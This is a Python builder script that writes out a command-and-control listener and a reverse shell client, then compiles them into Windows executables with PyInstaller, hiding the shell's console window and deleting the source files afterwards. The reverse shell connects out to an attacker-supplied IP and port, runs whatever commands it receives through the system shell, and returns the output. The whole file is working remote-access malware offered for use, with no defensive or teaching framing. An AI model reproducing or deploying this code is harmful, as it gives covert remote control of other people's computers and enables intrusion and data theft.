import os
import shutil
import subprocess

def create_script(ip, port):
    # Console Controller
    c2_content = f"""import socket
LISTEN_IP = "{ip}"
LISTEN_PORT = {port}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((LISTEN_IP, LISTEN_PORT))
s.listen(1)
print(f"[*] Listening on {{LISTEN_PORT}}...")
conn, addr = s.accept()
print(f"[+] Connection from {{addr}}")
while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        conn.send(b"exit")
        break
    conn.send(command.encode())
    response = conn.recv(4096).decode()
    print(response)
conn.close()
"""
    # Basic reverse shell
    shell_content = f"""import socket
import subprocess
import os
ATTACKER_IP = "{ip}"
ATTACKER_PORT = {port}
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                s.send(b"Changed directory.\\n")
            except Exception as e:
                s.send(str(e).encode() + b"\\n")
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)
    s.close()
connect()
"""
    # Writing the scripts
    with open("c2.py", "w") as file:
        file.write(c2_content)
    with open("shell.py", "w") as file:
        file.write(shell_content)
    print("[+] c2.py and shell.py successfully created!")

def build_executables():
    #Building scripts
    print("[+] Building executables...")
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "shell.py"], check=True)
    subprocess.run(["pyinstaller", "--onefile", "--console", "c2.py"], check=True)
    
    # Copy to main folder
    shutil.move("dist/shell.exe", "shell.exe")
    shutil.move("dist/c2.exe", "c2.exe")
    
    # Cleaning up build files
    shutil.rmtree("build")
    shutil.rmtree("dist")
    os.remove("shell.spec")
    os.remove("c2.spec")
    os.remove("shell.py")
    os.remove("c2.py")
    print("[+] Build completed and cleaned up!")


ip = input("Enter listener IP: ")
port = input("Enter listener PORT: ")
try:
    port = int(port)
    if port < 1 or port > 65535:
        raise ValueError
except ValueError:
    print("[-] Invalid port number! Must be between 1-65535.")
    exit()

create_script(ip, port)
build_executables()
